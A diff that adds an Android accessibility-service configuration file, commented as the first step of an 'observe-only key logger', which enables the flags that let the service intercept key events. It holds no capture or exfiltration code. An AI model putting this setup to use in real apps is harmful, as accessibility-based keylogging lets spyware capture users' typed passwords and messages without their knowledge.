@@ -1,0 +1,13 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!--
+  Step 1 config: observe-only key logger.
+  - canRequestFilterKeyEvents + flagRequestFilterKeyEvents are what let onKeyEvent fire at all.
+  - We deliberately set no event types we care about; we only want key events.
+-->
+<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
+    android:accessibilityEventTypes="typeAllMask"
+    android:accessibilityFeedbackType="feedbackGeneric"
+    android:accessibilityFlags="flagRequestFilterKeyEvents"
+    android:canRequestFilterKeyEvents="true"
+    android:description="@string/keylog_service_description"
+    android:notificationTimeout="0" />
